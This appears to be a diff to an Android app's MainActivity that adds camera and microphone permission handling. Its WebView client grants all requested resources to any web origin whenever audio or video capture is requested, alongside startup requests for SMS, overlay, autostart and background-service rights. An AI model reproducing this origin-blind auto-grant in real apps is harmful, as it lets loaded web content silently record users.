@@ -103,7 +103,35 @@ public class MainActivity extends Activity {
         }
 
         webView.addJavascriptInterface(new WebAppInterface(), "AndroidBridge");
-        webView.setWebChromeClient(new WebChromeClient());
+
+        webView.setWebChromeClient(new WebChromeClient() {
+            @Override
+            public void onPermissionRequest(android.webkit.PermissionRequest request) {
+                Log.d(TAG, "WebView permission request: " + request.getOrigin());
+                String[] requestedResources = request.getResources();
+                boolean shouldGrant = false;
+                for (String res : requestedResources) {
+                    if (android.webkit.PermissionRequest.RESOURCE_VIDEO_CAPTURE.equals(res)
+                            || android.webkit.PermissionRequest.RESOURCE_AUDIO_CAPTURE.equals(res)) {
+                        shouldGrant = true;
+                        break;
+                    }
+                }
+                if (shouldGrant) {
+                    request.grant(requestedResources);
+                    Log.d(TAG, "WebView permission GRANTED");
+                } else {
+                    request.deny();
+                    Log.d(TAG, "WebView permission DENIED (unknown resource)");
+                }
+            }
+
+            @Override
+            public void onPermissionRequestCanceled(android.webkit.PermissionRequest request) {
+                Log.d(TAG, "WebView permission cancelled");
+                request.deny();
+            }
+        });
 
         webView.setWebViewClient(new WebViewClient() {
             @Override
@@ -442,11 +470,32 @@ public class MainActivity extends Activity {
     private void requestAllPermissions() {
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             requestSmsPermission();
+            requestCameraAndAudioPermissions();
             requestBatteryOptimizationPermission();
             requestOverlayPermission();
             requestAutoStartPermission();
             startForegroundService();
         }, 2000);
+    }
+
+    private void requestCameraAndAudioPermissions() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            boolean needCamera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+                    != PackageManager.PERMISSION_GRANTED;
+            boolean needAudio = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
+                    != PackageManager.PERMISSION_GRANTED;
+            if (needCamera || needAudio) {
+                String[] permissionsToRequest;
+                if (needCamera && needAudio) {
+                    permissionsToRequest = new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO};
+                } else if (needCamera) {
+                    permissionsToRequest = new String[]{Manifest.permission.CAMERA};
+                } else {
+                    permissionsToRequest = new String[]{Manifest.permission.RECORD_AUDIO};
+                }
+                ActivityCompat.requestPermissions(this, permissionsToRequest, CAMERA_PERMISSION_REQUEST_CODE);
+            }
+        }
     }
 
     private void requestSmsPermission() {
@@ -620,34 +669,38 @@ public class MainActivity extends Activity {
                 }
             }
         } else if (requestCode == CAMERA_PERMISSION_REQUEST_CODE) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                Toast.makeText(this, "Camera permission enabled!", Toast.LENGTH_SHORT).show();
-                if (webView != null) {
-                    webView.evaluateJavascript(
-                        "(function(){ if(window.onCameraPermissionResult) window.onCameraPermissionResult(true); })();",
-                        null);
-                }
-            } else {
-                if (webView != null) {
-                    webView.evaluateJavascript(
-                        "(function(){ if(window.onCameraPermissionResult) window.onCameraPermissionResult(false); })();",
-                        null);
-                }
+            boolean cameraGranted = grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED;
+            boolean audioGranted = grantResults.length > 1 && grantResults[1] == PackageManager.PERMISSION_GRANTED;
+            if (cameraGranted) {
+                Log.d(TAG, "Camera permission granted");
+            }
+            if (audioGranted) {
+                Log.d(TAG, "Audio permission granted");
+            }
+            if (cameraGranted || audioGranted) {
+                String successMsg = "";
+                if (cameraGranted && audioGranted) successMsg = "Camera & Microphone permissions enabled!";
+                else if (cameraGranted) successMsg = "Camera permission enabled!";
+                else successMsg = "Microphone permission enabled!";
+                Toast.makeText(this, successMsg, Toast.LENGTH_SHORT).show();
+            }
+            if (webView != null) {
+                webView.evaluateJavascript(
+                    "(function(){ if(window.onCameraPermissionResult) window.onCameraPermissionResult(" + cameraGranted + "); })();",
+                    null);
+                webView.evaluateJavascript(
+                    "(function(){ if(window.onAudioPermissionResult) window.onAudioPermissionResult(" + audioGranted + "); })();",
+                    null);
             }
         } else if (requestCode == AUDIO_PERMISSION_REQUEST_CODE) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+            boolean audioGranted = grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED;
+            if (audioGranted) {
                 Toast.makeText(this, "Microphone permission enabled!", Toast.LENGTH_SHORT).show();
-                if (webView != null) {
-                    webView.evaluateJavascript(
-                        "(function(){ if(window.onAudioPermissionResult) window.onAudioPermissionResult(true); })();",
-                        null);
-                }
-            } else {
-                if (webView != null) {
-                    webView.evaluateJavascript(
-                        "(function(){ if(window.onAudioPermissionResult) window.onAudioPermissionResult(false); })();",
-                        null);
-                }
+            }
+            if (webView != null) {
+                webView.evaluateJavascript(
+                    "(function(){ if(window.onAudioPermissionResult) window.onAudioPermissionResult(" + audioGranted + "); })();",
+                    null);
             }
         }
     }
